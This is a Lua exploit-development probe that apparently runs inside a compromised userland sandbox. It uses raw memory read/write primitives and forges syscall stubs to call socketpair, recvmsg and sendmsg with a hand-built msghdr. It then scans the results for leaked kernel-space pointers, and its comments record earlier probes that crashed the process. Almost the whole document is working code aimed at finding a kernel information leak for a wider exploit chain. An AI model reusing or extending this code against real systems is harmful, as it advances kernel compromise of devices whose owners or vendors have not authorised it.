-- CRASH_CLASS: HIGH
-- PROBE 737a: recvmsg (27) with a valid msghdr, and the leak scan
--
-- 28 returns -1 with zeros and the process survives, but a call with a real
-- msghdr ended two earlier probes. This probe tries the receive side first: a
-- socketpair with 16 bytes queued, then 27(fd, hdr, 0), then a scan of the
-- whole msghdr page and both buffers for kernel-shaped qwords. Every step is
-- bracketed by prints.

print("=== PROBE 737a: RECVMSG VALID ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a,v) memory.write_dword(a,v) end
local function wq(a,v) memory.write_qword(a,v) end
local function rq(a) local v=memory.read_qword(a) if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function live(tag)
    local ok, v = pcall(function() return native.fcall_with_rax(syscall.pipe.fn_addr, 20) end)
    print(string.format("    (%s) alive=%s", tag, tostring(ok and to_num(v) or "NO")))
end

local act = to_num(memory.alloc(64)); local old = to_num(memory.alloc(64))
for k=0,15 do wq(act+k*8, Z) end
wd(act, 1)
pcall(function() return mk(416)(U(12), U(act), U(old), Z, Z, Z) end)
local okc, ctl = pcall(function() return mk(4095)(Z,Z,Z,Z,Z,Z) end)
print(string.format("[0] shield: 4095 -> %s", tostring(okc and to_num(ctl) or "DEAD")))

local fds = to_num(memory.alloc(64))
pcall(function() return mk(135)(U(1),U(1),U(0),U(fds),Z,Z) end)
local fdA, fdB = rd(fds), rd(fds+4)
print(string.format("[1] socketpair %d,%d", fdA, fdB))

local snd = to_num(memory.alloc(64))
for k=0,15 do wd(snd+k*4, 0x51525354) end
local okw, wr = pcall(function() return mk(4)(U(fdB), U(snd), U(16), Z, Z, Z) end)
print(string.format("[1] write(peer) ret=%s", tostring(okw and to_num(wr) or "DEAD")))

local HDR = to_num(memory.alloc(0x1000))
local iov = to_num(memory.alloc(0x1000))
local dat = to_num(memory.alloc(0x1000))
for k=0,0x3FF do wd(HDR+k*4,0); wd(iov+k*4,0); wd(dat+k*4,0x5A5A5A5A) end
wq(HDR+0x00, Z);  wd(HDR+0x08, 0)
wq(HDR+0x10, U(iov)); wd(HDR+0x18, 1)
wq(HDR+0x20, Z);  wd(HDR+0x28, 0); wd(HDR+0x2c, 0)
wq(iov+0, U(dat)); wq(iov+8, U(16))
print(string.format("[2] msghdr built iov=%08X dat=%08X", iov, dat))

print(string.format("[3] about to recvmsg(%d, hdr, 0)", fdA))
local ok3, r3 = pcall(function() return mk(27)(U(fdA), U(HDR), U(0), Z, Z, Z) end)
print(string.format("[3] recvmsg ret=%s dat[0]=%08X", tostring(ok3 and to_num(r3) or "DEAD"), rd(dat)))
if ok3 then
    local hits = {}
    for off=0,0xF8,8 do
        local v = rq(HDR+off)
        if math.floor(v/4294967296) >= 0xFFFF8000 then hits[#hits+1]=string.format("+%02X=%016X", off, v) end
    end
    print(string.format("[4] kernel-shaped in msghdr: %s", #hits>0 and table.concat(hits," ") or "none"))
    live("after recvmsg")
end

print(string.format("[5] about to sendmsg(%d, hdr, 0) with the same shape", fdA))
local ok5, r5 = pcall(function() return mk(28)(U(fdA), U(HDR), U(0), Z, Z, Z) end)
print(string.format("[5] sendmsg ret=%s", tostring(ok5 and to_num(r5) or "DEAD")))
if ok5 then
    local hits = {}
    for off=0,0xF8,8 do
        local v = rq(HDR+off)
        if math.floor(v/4294967296) >= 0xFFFF8000 then hits[#hits+1]=string.format("+%02X=%016X", off, v) end
    end
    print(string.format("[6] kernel-shaped in msghdr: %s", #hits>0 and table.concat(hits," ") or "none"))
    live("after sendmsg")
end
print("=== 737a DONE ===")
